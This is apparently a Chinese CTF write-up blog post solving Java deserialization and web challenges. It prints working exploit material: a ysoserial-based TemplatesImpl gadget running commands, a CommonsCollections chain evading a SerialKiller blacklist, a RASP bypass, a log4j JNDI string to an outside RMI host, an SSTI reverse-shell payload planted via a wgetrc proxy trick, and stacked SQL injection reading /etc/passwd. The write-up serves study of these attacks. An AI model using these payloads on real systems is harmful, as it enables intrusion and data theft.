java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.Serializable;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;/* * Utility class - based on code found in ysoserial, includes method calls used in * ysoserial.payloads.util specifically the Reflections, Gadgets, and ClassFiles classes. These were * consolidated into a single util class for the sake of brevity; they are otherwise unchanged. * * Additionally, uses code based on marshalsec.gadgets.ToStringUtil.makeSpringAOPToStringTrigger * to create a toString trigger * * ysoserial by Chris Frohoff - https://github.com/frohoff/ysoserial * marshalsec by Moritz Bechler - https://github.com/mbechler/marshalsec */public class Utils &#123; static &#123; // special case for using TemplatesImpl gadgets with a SecurityManager enabled System.setProperty(DESERIALIZE_TRANSLET, &quot;true&quot;); // for RMI remote loading System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;); &#125; public static final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;; public static class StubTransletPayload extends AbstractTranslet implements Serializable &#123; private static final long serialVersionUID = -5971610431559700674L; public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException &#123;&#125; @Override public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException &#123;&#125; &#125; // required to make TemplatesImpl happy public static class Foo implements Serializable &#123; private static final long serialVersionUID = 8207363842866235160L; &#125; public static InvocationHandler createMemoizedInvocationHandler (final Map&lt;String, Object&gt; map ) throws Exception &#123; return (InvocationHandler) Utils.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map); &#125; public static Object createTemplatesImpl ( final String command ) throws Exception &#123; if ( Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;)) ) &#123; return createTemplatesImpl( command, Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;), Class.forName(&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;), Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;)); &#125; return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class); &#125; public static &lt;T&gt; T createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory ) throws Exception &#123; final T templates = tplClass.newInstance(); // use template gadget class ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(Utils.StubTransletPayload.class)); pool.insertClassPath(new ClassClassPath(abstTranslet)); final CtClass clazz = pool.get(Utils.StubTransletPayload.class.getName()); // run command in static initializer // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections String cmd = &quot;System.out.println(\\&quot;whoops!\\&quot;); java.lang.Runtime.getRuntime().exec(\\&quot;&quot; + command.replaceAll(&quot;\\\\\\\\&quot;,&quot;\\\\\\\\\\\\\\\\&quot;).replaceAll(&quot;\\&quot;&quot;, &quot;\\\\\\&quot;&quot;) + &quot;\\&quot;);&quot;; clazz.makeClassInitializer().insertAfter(cmd); // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion) clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime()); CtClass superC = pool.get(abstTranslet.getName()); clazz.setSuperclass(superC); final byte[] classBytes = clazz.toBytecode(); // inject class bytes into instance Utils.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123; classBytes, Utils.classAsBytes(Utils.Foo.class) &#125;); // required to make TemplatesImpl happy Utils.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;); Utils.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance()); return templates; &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field = null; try &#123; field = clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); &#125; return field; &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Object getFieldValue(final Object obj, final String fieldName) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); return field.get(obj); &#125; public static Constructor&lt;?&gt; getFirstCtor(final String name) throws Exception &#123; final Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[0]; ctor.setAccessible(true); return ctor; &#125; @SuppressWarnings ( &#123;&quot;unchecked&quot;&#125; ) public static &lt;T&gt; T createWithConstructor ( Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123; Constructor&lt;? super T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes); objCons.setAccessible(true); Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons); sc.setAccessible(true); return (T)sc.newInstance(consArgs); &#125; public static String classAsFile(final Class&lt;?&gt; clazz) &#123; return classAsFile(clazz, true); &#125; public static String classAsFile(final Class&lt;?&gt; clazz, boolean suffix) &#123; String str; if (clazz.getEnclosingClass() == null) &#123; str = clazz.getName().replace(&quot;.&quot;, &quot;/&quot;); &#125; else &#123; str = classAsFile(clazz.getEnclosingClass(), false) + &quot;$&quot; + clazz.getSimpleName(); &#125; if (suffix) &#123; str += &quot;.class&quot;; &#125; return str; &#125; public static byte[] classAsBytes(final Class&lt;?&gt; clazz) &#123; try &#123; final byte[] buffer = new byte[1024]; final String file = classAsFile(clazz); final InputStream in = Utils.class.getClassLoader().getResourceAsStream(file); if (in == null) &#123; throw new IOException(&quot;couldn&#x27;t find &#x27;&quot; + file + &quot;&#x27;&quot;); &#125; final ByteArrayOutputStream out = new ByteArrayOutputStream(); int len; while ((len = in.read(buffer)) != -1) &#123; out.write(buffer, 0, len); &#125; return out.toByteArray(); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; &#125; public static HashMap&lt;Object, Object&gt; makeMap (Object v1, Object v2 ) throws Exception &#123; HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;(); Utils.setFieldValue(s, &quot;size&quot;, 2); Class&lt;?&gt; nodeC; try &#123; nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;); &#125; catch ( ClassNotFoundException e ) &#123; nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;); &#125; Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC); nodeCons.setAccessible(true); Object tbl = Array.newInstance(nodeC, 2); Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null)); Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null)); Utils.setFieldValue(s, &quot;table&quot;, tbl); return s; &#125; public static Object makeXStringToStringTrigger(Object o,Object bean) throws Exception &#123; return Utils.makeMap(new HotSwappableTargetSource(o), new HotSwappableTargetSource(bean)); &#125;&#125; 但是当你兴冲冲的写好利用链以后，会发现几个问题 首先你会看到一行报错,Class is not registered: java.util.HashMap 那么你肯定会疑惑这是什么玩意儿？它来自哪里？ 我们可以看到在com.esotericsoftware.kryo.Kryo#Kryo(com.esotericsoftware.kryo.ClassResolver, com.esotericsoftware.kryo.ReferenceResolver) 首先实例化的时候注册了一些基本类型 然后在代码当中有this.kryo.register(Mocha.class); 可以看到默认是FieldSerializer 那我们也知道我们这个思路触发的核心是通过com.esotericsoftware.kryo.serializers.MapSerializer，但是这里我们没法自己注册怎么办呢，还记得上面那个路由么，demo路由当中可以根据我们前端传入的json当中的熟悉控制执行对应的set方法做属性更改，这里我不直接说需要更改哪些属性去解决这道题，个人更倾向于遇到一个问题解决一个问题 那么既然能控制属性，我们也得知道能控制那一些，通过简单输出可以得到 123456789101112setWarnUnregisteredClassessetDefaultSerializersetDefaultSerializersetClassLoadersetRegistrationRequiredsetReferencessetCopyReferencessetReferenceResolversetInstantiatorStrategysetAutoResetsetMaxDepthsetOptimizedGenerics 回到刚刚的问题 既然如此那么我们首先需要知道在哪里抛出了这个异常，可以看到在 com.esotericsoftware.kryo.Kryo#getRegistration(java.lang.Class) 简单列出现在的调用栈，是在序列化的过程当中 123456getRegistration:579, Kryo (com.esotericsoftware.kryo)writeClass:112, DefaultClassResolver (com.esotericsoftware.kryo.util)writeClass:613, Kryo (com.esotericsoftware.kryo)writeClassAndObject:708, Kryo (com.esotericsoftware.kryo)ser:97, Testt (demo)main:121, Testt (demo) 可以看到根据类型在this.classResolver.getRegistration无结果就会抛出异常，通过debug输出classResolver当中的关键信息，可以很明显得到基本都是一些基本的数据类型,没有我们的Map 12345678910111213141516171819&#123;char=[5, char], long=[7, long], class java.lang.Byte=[4, byte], class java.lang.Character=[5, char], double=[8, double], class java.lang.Short=[6, short], int=[0, int], class java.lang.Integer=[0, int], byte=[4, byte], float=[2, float], class java.lang.Double=[8, double], class java.lang.Boolean=[3, boolean], boolean=[3, boolean], short=[6, short], class java.lang.Long=[7, long], class java.lang.String=[1, String], class java.lang.Float=[2, float]&#125; 我们再来看在抛出异常的那部分，如果将registrationRequired设置为false，则可以略过这些过程 此时它会执行com.esotericsoftware.kryo.util.DefaultClassResolver#registerImplicit =&gt;com.esotericsoftware.kryo.Kryo#getDefaultSerializer最终获取到我们需要的com.esotericsoftware.kryo.serializers.MapSerializer 通过比对属性以及上面提到的可利用的set方法，我们能很容易通过payload的传入控制这个过程 1&#123;&quot;RegistrationRequired&quot;:false&#125; ok当你感觉又行的时候，又兴致冲冲运行了代码，此时又出现Class cannot be created (missing no-arg constructor):，字面意思是我们序列化的类需要有无参构造函数 那我们再跟进代码看看实例化报错到底是怎么回事，在实例化一个类的时候会通过调用com.esotericsoftware.kryo.Kryo#newInstantiator， 并最终会调用到com.esotericsoftware.kryo.util.DefaultInstantiatorStrategy#newInstantiatorOf 此时的调用栈为 1234567891011121314newInstantiatorOf:96, DefaultInstantiatorStrategy (com.esotericsoftware.kryo.util)newInstantiator:1190, Kryo (com.esotericsoftware.kryo)newInstance:1199, Kryo (com.esotericsoftware.kryo)create:163, FieldSerializer (com.esotericsoftware.kryo.serializers)read:122, FieldSerializer (com.esotericsoftware.kryo.serializers)readClassAndObject:880, Kryo (com.esotericsoftware.kryo)read:226, MapSerializer (com.esotericsoftware.kryo.serializers)read:42, MapSerializer (com.esotericsoftware.kryo.serializers)readClassAndObject:880, Kryo (com.esotericsoftware.kryo)read:226, MapSerializer (com.esotericsoftware.kryo.serializers)read:42, MapSerializer (com.esotericsoftware.kryo.serializers)readClassAndObject:880, Kryo (com.esotericsoftware.kryo)deser:110, Testt (demo)main:126, Testt (demo) 可以看到抛错的原因就是下面的这串代码，它默认我们的类有无参构造函数 那为了解决这个问题我们也得知道是否可以不使用DefaultInstantiatorStrategy，转而使用其他InstantiatorStrategy的子类呢，答案是可以的，上面我们可以看到函数实例化的过程是通过this.strategy.newInstantiatorOf(type)，而这个DefaultInstantiatorStrategy来源于strategy属性 正好在Kryo类当中有set方法可以实现，com.esotericsoftware.kryo.Kryo#setInstantiatorStrategy，可以看到如果是StdInstantiatorStrategy类则正好符合（官方文档比代码好看） 因此我们得到最终传参 1&#123;&quot;polish&quot;:true,&quot;RegistrationRequired&quot;:false,&quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;&#125; 可以看到又报错了，_tfactory空指针异常 这里如何解决呢？其实很简单，别忘了我们这个可是打ROME，通过触发com.rometools.rome.feed.impl.EqualsBean#beanEquals我们能调用任意get方法，这时候不难想到二次反序列化，java.security.SignedObject#getObject，其实就是虎符的思路了没啥难度 123456789101112public Object getObject() throws IOException, ClassNotFoundException&#123; // creating a stream pipe-line, from b to a ByteArrayInputStream b = new ByteArrayInputStream(this.content); ObjectInput a = new ObjectInputStream(b); Object obj = a.readObject(); b.close(); a.close(); return obj;&#125; 因此不难得到payload 1payloadhere 绕Rasp这时候你注入内存马执行会发现什么都是空的 这时候你一定很疑问为什么本地打通了远程不行，我也很疑惑，之后看到出题人说 既然存在waf，那么我们第一件事情是什么呢，当然是验证是否是对payload的过滤 因此我将执行的字节码改成 1Thread.sleep(10000); 成功看到页面延时 这时候猜到可能有Rasp(毕竟对于Java过滤base64解码后的字符串有点傻) 那第一步就要知道rasp的文件内容，用个之前从p牛那里学的伪协议小trick方便我读文件以及列目录 12345678910String urlContent = &quot;&quot;;final URL url = new URL(request.getParameter(&quot;read&quot;));final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));String inputLine = &quot;&quot;;while ((inputLine = in.readLine()) != null) &#123; urlContent = urlContent + inputLine + &quot;\\n&quot;;&#125;in.close();writer.println(urlContent); 之后成功得到rasp的地址，/app/jrasp.jar，那么下载下来分析即可，图没截完，意思是只要执行到java.lang.ProcessImpl的start方法,而这也就封掉了之前常见的Runtime,ProcessBuilder，甚至js执行之类的，el执行都不行，道理很简单会调用到java.lang.ProcessImpl 如何绕过也很简单去找更下一层的调用即可，也就是通过UNIXProcess即可 后面很恶心一个计算题 脚本有个地方小错误导致三小时没找到前面不能加CHLD_IN导致提前输入错误答案似乎 12345678910111213141516use strict;use IPC::Open3;my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, &#x27;/readflag&#x27; ) or die &quot;open3() failed!&quot;;my $r;$r = &lt;CHLD_OUT&gt;;print &quot;$r&quot;;$r = &lt;CHLD_OUT&gt;;print &quot;$r&quot;;$r = substr($r,0,-3);$r = eval &quot;$r&quot;;print &quot;$r\\n&quot;;print CHLD_IN &quot;$r\\n&quot;;$r = &lt;CHLD_OUT&gt;;print &quot;$r&quot;; EzJava – Bypass Serialkiller解读环境首先附件给了两个东西一个jar，一个serialkiller的配置文件，下面是jar当中的目录架构 这有两个控制器但是第一个没啥意义，这个路由很明显需要反序列化 123456789101112131415161718@RestControllerpublic class HelloController &#123; public HelloController() &#123; &#125; @GetMapping(&#123;&quot;/hello&quot;&#125;) public String index() &#123; return &quot;hello&quot;; &#125; @PostMapping(&#123;&quot;/hello&quot;&#125;) public String index(@RequestBody String baseStr) throws Exception &#123; byte[] decode = Base64.getDecoder().decode(baseStr); ObjectInputStream ois = new SerialKiller(new ByteArrayInputStream(decode), &quot;serialkiller.xml&quot;); ois.readObject(); return &quot;hello&quot;; &#125;&#125; 简单看下SerialKiller类，实现是载入配置获得黑白名单，通过resolveClass做了过滤，接下来就来看看黑名单，将我们反序列化的关键点给拿捏了 1234567891011121314&lt;blacklist&gt; &lt;!-- ysoserial&#x27;s CommonsCollections1,3,5,6 payload --&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.Transformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.InvokerTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.ChainedTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.ConstantTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.InstantiateTransformer$&lt;/regexp&gt; &lt;!-- ysoserial&#x27;s CommonsCollections2,4 payload --&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections4\\.functors\\.InvokerTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections4\\.functors\\.ChainedTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections4\\.functors\\.ConstantTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections4\\.functors\\.InstantiateTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections4\\.comparators\\.TransformingComparator$&lt;/regexp&gt;&lt;/blacklist&gt; Bypass既然如此那么首先就是想到去找替换类达到同样的效果咯 下面是我通过简单搜索发现的类，当然后面发现解决这题方案很多，我只给一个 FactoryTransformer可以看到这个trnasfromer的transform方法，可以调用任意Factory子类的create方法 123456789101112131415161718192021222324public class FactoryTransformer implements Transformer, Serializable &#123; private static final long serialVersionUID = -6817674502475353160L; private final Factory iFactory; public static Transformer getInstance(Factory factory) &#123; if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; else &#123; return new FactoryTransformer(factory); &#125; &#125; public FactoryTransformer(Factory factory) &#123; this.iFactory = factory; &#125; public Object transform(Object input) &#123; return this.iFactory.create(); &#125; public Factory getFactory() &#123; return this.iFactory; &#125;&#125; 可以看到也不多，从名字就可以看出，其中有两个可以用的 其中org.apache.commons.collections.functors.ConstantFactory#create可以返回任意值 代替ConstantTransformer org.apache.commons.collections.functors.InstantiateFactory#create可以实例化任意类 代替InstantiateTransformer去实例化对象 那看到这里你有什么思路了吗？熟悉CC链的童鞋一定会知道TrAXFilter的构造函数当中可以帮助我们触发TemplatesImpl字节码加载的过程 通过如下构造，我们能很轻松的触发计算器 Ps小细节：对expMap做put操作会触发hashCode会导致利用链在序列化过程当中触发导致报错，别忘了先设置一个无关紧要的transformer(比如ConstantTransformer)最后再反射替换成我们恶意的Transformer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.FactoryTransformer;import org.apache.commons.collections.functors.InstantiateFactory;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import org.nibblesec.tools.SerialKiller;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test &#123; public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123; Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception&#123; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123; ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode() &#125;); setFieldValue(obj, &quot;_name&quot;, &quot;1&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); InstantiateFactory instantiateFactory; instantiateFactory = new InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class ,new Class[]&#123;javax.xml.transform.Templates.class&#125;,new Object[]&#123;obj&#125;); FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory); ConstantTransformer constantTransformer = new ConstantTransformer(1); Map innerMap = new HashMap(); LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer); TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;); Map expMap = new HashMap(); expMap.put(tme, &quot;valuevalue&quot;); setFieldValue(outerMap,&quot;factory&quot;,factoryTransformer); outerMap.remove(&quot;keykey&quot;); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(expMap); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream ois = new SerialKiller(byteArrayInputStream, &quot;/Users/y4tacker/Downloads/ezjavaz/serialkiller.xml&quot;); ois.readObject(); &#125;&#125; 后面就是获取注入一个内存马即可获取flag，这部分不谈基础东西而已 那么就结束了这一题 Java_mem_shell_Filter首先只给了一个登录功能 通过随便访问不存在页面，导致报错抛出也可以得到是tomcat8.0.12版本，那版本问题可以忽略了 接下来由于后端响应真的很快，在公共环境下能做到这样首先考虑弱口令，爆破无效 突然想到能不能打log4j2 1name=$&#123;jndi:rmi://xxxxx/exp&#125;&amp;password=admin 后面拿flag也是比较阴间，这里不重要不写了，涉及到dump内存的操作还是写写吧 1jmap -dump:format=b,file=e.bin &lt;pid&gt; Java_mem_shell_Basic可以看见直接是一个tomcat，看了版本没啥可利用的1day，同时版本比较低不存在幽灵猫漏洞 那么接下来就只能考虑后台弱口令了，tomcat/tomcat，之后部署一个war包上去，直接冰蝎一把梭哈，就是flag位置比较阴间/usr/local/apache-tomcat-8.0.12/work/Catalina/localhost/ROOT/org/apache/jsp/threatbook_jsp.java","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Kryo","slug":"Kryo","permalink":"https://y4tacker.github.io/tags/Kryo/"},{"name":"Serialkiller","slug":"Serialkiller","permalink":"https://y4tacker.github.io/tags/Serialkiller/"}]},{"title":"2022*CTF-Web","slug":"year/2022/4/2022-CTF-Web","date":"2022-04-18T03:00:13.000Z","updated":"2024-08-04T09:01:49.210Z","comments":true,"path":"2022/04/18/year/2022/4/2022-CTF-Web/","link":"","permalink":"https://y4tacker.github.io/2022/04/18/year/2022/4/2022-CTF-Web/","excerpt":"","text":"2022*CTF-Web写在前面XCTF国际赛系列一直不错，周末参与了下这次比赛，虽然没有Java但总体还是蛮有意思 这里没按题目顺序写，只是写了在我心中从上到下的排序，对有源码的题目做了备份 oh-my-lotto ​ 链接: https://pan.baidu.com/s/1G53aYqIIbHGlowdWFhkKqw 提取码: oism oh-my-lotto心目中比较有趣的一题呗，重生之我是赌神 这是一个非预期，因为后面又上了个revenge，简单分析下题目，先看看docker内容，可以知道大概的结构 12345678910111213141516171819version: &quot;3&quot; services: lotto: build: context: lotto/ dockerfile: Dockerfile container_name: &quot;lotto&quot; app: build: context: app/ dockerfile: Dockerfile links: - lotto container_name: &quot;app&quot; ports: - &quot;8880:8080&quot; 之后看看代码，这里面有三个路由，从短到长 首先result路由返回/app/lotto_result.txt文件内容结果 123456789@app.route(&quot;/result&quot;, methods=[&#x27;GET&#x27;])def result(): if os.path.exists(&quot;/app/lotto_result.txt&quot;): lotto_result = open(&quot;/app/lotto_result.txt&quot;, &#x27;rb&#x27;).read().decode() else: lotto_result = &#x27;&#x27; return render_template(&#x27;result.html&#x27;, message=lotto_result) forecast路由可以上传一个文件保存到/app/guess/forecast.txt 1234567891011121314@app.route(&quot;/forecast&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def forecast(): message = &#x27;&#x27; if request.method == &#x27;GET&#x27;: return render_template(&#x27;forecast.html&#x27;) elif request.method == &#x27;POST&#x27;: if &#x27;file&#x27; not in request.files: message = &#x27;Where is your forecast?&#x27; file = request.files[&#x27;file&#x27;] file.save(&#x27;/app/guess/forecast.txt&#x27;) message = &quot;OK, I get your forecast. Let&#x27;s Lotto!&quot; return render_template(&#x27;forecast.html&#x27;, message=message) 还有最关键的lotto路由(代码太多就不放完了)，可以 1os.system(&#x27;wget --content-disposition -N lotto&#x27;) 如果预测的值与环境随机生成的相等就能获得flag 12345678910111213141516171819202122232425262728@app.route(&quot;/lotto&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def lotto(): elif request.method == &#x27;POST&#x27;: //看到flag从环境变量当中取出 flag = os.getenv(&#x27;flag&#x27;) lotto_key = request.form.get(&#x27;lotto_key&#x27;) or &#x27;&#x27; lotto_value = request.form.get(&#x27;lotto_value&#x27;) or &#x27;&#x27; lotto_key = lotto_key.upper() if safe_check(lotto_key): os.environ[lotto_key] = lotto_value try: //从内网http://lotto当中获得随机值 os.system(&#x27;wget --content-disposition -N lotto&#x27;) if os.path.exists(&quot;/app/lotto_result.txt&quot;): lotto_result = open(&quot;/app/lotto_result.txt&quot;, &#x27;rb&#x27;).read() else: lotto_result = &#x27;result&#x27; if os.path.exists(&quot;/app/guess/forecast.txt&quot;): forecast = open(&quot;/app/guess/forecast.txt&quot;, &#x27;rb&#x27;).read() else: forecast = &#x27;forecast&#x27; if forecast == lotto_result: return flag 其中内网的lotto页面可以看到就是随机生成20个40以内随机数并返回 123456789101112131415@app.route(&quot;/&quot;)def index(): lotto = [] for i in range(1, 20): n = str(secrets.randbelow(40)) lotto.append(n) r = &#x27;\\n&#x27;.join(lotto) response = make_response(r) response.headers[&#x27;Content-Type&#x27;] = &#x27;text/plain&#x27; response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=lotto_result.txt&#x27; return responseif __name__ == &quot;__main__&quot;: app.run(debug=True, host=&#x27;0.0.0.0&#x27;, port=80) 同时对于我们能控制的环境变量也有过滤safe_check，那像p牛之前提到的直接RCE就不行了 1234def safe_check(s): if &#x27;LD&#x27; in s or &#x27;HTTP&#x27; in s or &#x27;BASH&#x27; in s or &#x27;ENV&#x27; in s or &#x27;PROXY&#x27; in s or &#x27;PS&#x27; in s: return False return True 既然题目要求如果预测成功就返回给我flag，那有啥办法能控制吗，这里就用到了PATH PATH变量就是用于保存可以搜索的目录路径，如果待运行的程序不在当前目录，操作系统便可以去依次搜索PATH变量变量中记录的目录，如果在这些目录中找到待运行的程序，操作系统便可以直接运行，前提是有执行权限 那这样就比较简单了，如果我们控制环境变量PATH，让他找不到wget，这样wget --content-disposition -N lotto就会报错导致程序终止，/app/lotto_result.txt当中的内容就一直是第一次访问，随机生成的那个值了 访问/lotto获得第一次的结果 访问result页面记录内容下来备用 修改环境变量PATH后，发送预测值，再次访问/lotto即可 可以看到确实得到了flag，其中res.txt是第一次环境随机生成的结果 oh-my-lotto-revenge做了一个修正，就算预测成功也没有结果返回，那就考虑如何rce了 12345if forecast == lotto_result: return &quot;You are right!But where is flag?&quot;else: message = &#x27;Sorry forecast failed, maybe lucky next time!&#x27; return render_template(&#x27;lotto.html&#x27;, message=message) 先读文档https://www.gnu.org/software/wget/manual/wget.html#:~:text=6.1-,Wgetrc%20Location,-When%20initializing%2C%20Wget 发现有一个WGETRC，如果我们能够控制环境变量就可以操纵wget的参数了，这里有很多有意思的变量 这里说两个我解决这个问题用到的，一个是http_proxy，很明显如果配置了这个，本来是直接wget访问http://lotto的就会先到我们这里做一个转发，我们就可以当一个中间人 12http_proxy = stringUse string as HTTP proxy, instead of the one specified in environment. 做个实验，此时再wget以后，成功接收到这个请求 因此我们只需要控制返回内容即可，那既然可以控制内容了，那能否控制目录呢，正好有output_document，相当于-O参数 12output_document = fileSet the output filename—the same as ‘-O file’. 那么我覆盖index.html打SSTI即可 因此得到payload，写入内容为 12http_proxy=http://xxxxxoutput_document = templates/index.html 控制返回内容为 1&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;反弹shell&#x27;).read()&#125;&#125; 1234567891011121314151617181920import requestsdef web(): url = &quot;http://xxx/&quot; r = requests.post(url + &quot;forecast&quot;, files=&#123;&#x27;file&#x27;: open(&quot;/Users/y4tacker/PycharmProjects/pythonProject/lottt/y4.txt&quot;, &quot;rb&quot;)&#125;) data = &#123; &quot;lotto_key&quot;: &quot;WGETRC&quot;, &quot;lotto_value&quot;: &quot;/app/guess/forecast.txt&quot; &#125; r = requests.post(url + &quot;lotto&quot;, data=data) print(r.text)if __name__ == &#x27;__main__&#x27;: web() oh-my-notepro好吧又是黑盒，烦死了 登录后，只有一个创建note的功能点，先是测试了下各种SSTI的payload没啥反应，之后猜测是不是要获取到admin的noteid，首先看到这种又臭又长0pn2jtgnfer9zaijadymsmq347eqmay3的字符肯定是不能爆破，尝试sql注入，经典单引号报错 尝试回显有五列，但是payload这么简单，毕竟是XCTF肯定不可能sql注入就能从数据库拖出flag(大概率无过滤是不可能这么简单的)，当然也确实验证了没有flag，甚至没有admin用户 接下来尝试load_file读文件也不行，后面想去看看一些配置信息，一般我们通过类似show variables like xxx这样去读，但是其实也可以直接通过sql语句拿到global当中的信息 1select @@global.secure_file_priv 好吧真拿你没办法洛 后面发现local_infile开了，不知道这是啥可以看看CSS-T | Mysql Client 任意文件读取攻击链拓展 那么要利用肯定常规的注入不行，只有一个东西能满足，那就是堆叠注入，简单验证下 1http://123.60.72.85:5002/view?note_id=0&#x27; union select 1,2,3,4,5;select sleep(2)--+ 页面确实有延时那验证了我们的猜想，接下来读文件 1http://123.60.72.85:5002/view?note_id=0&#x27; union select 1,2,3,4,5; create table y4(t text); load data local infile &#x27;/etc/passwd&#x27; INTO TABLE y4 LINES TERMINATED BY &#x27;\\n&#x27;--+ 果然可以bro 那么想要rce只剩一个方法咯，都有报错页面了，算算pin呗 需要： 1.flask所登录的用户名 2.modname-一般固定为flask.app 3.getattr(app, “name”, app.class.name) - 固定，一般为Flask 4.在flask库下app.py的绝对路径，通过报错泄漏 5.当前网络的mac地址的十进制数 6.docker机器id 网上直接抄了一个发现不对，简单看了flask生成pin码的地方，在python3.8/site-packages/werkzeug/debug/__init__.py#get_pin_and_cookie_name 发现python3.8以后从原来的md5改成了sha1 那简单写个利用脚本就好了呗 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import requestsimport reimport hashlibfrom itertools import chainurl = &quot;http://124.70.185.87:5002/view?note_id=&quot;payload1 = &quot;0&#x27; union select 1,2,3,4,5; create table y4(t text); load data local infile &#x27;/sys/class/net/eth0/address&#x27; INTO TABLE y4 LINES TERMINATED BY &#x27;\\\\n&#x27;--+&quot;payload2 = &quot;0&#x27; union select 1,2,3,4,5; create table yy4(t text); load data local infile &#x27;/proc/self/cgroup&#x27; INTO TABLE yy4 LINES TERMINATED BY &#x27;\\\\n&#x27;--+&quot;payload3 = &quot;0&#x27; union select 1,2,3,(select group_concat(t) from y4),1; --+&quot;payload4 = &quot;0&#x27; union select 1,2,3,(select group_concat(t) from yy4),1; --+&quot;headers = 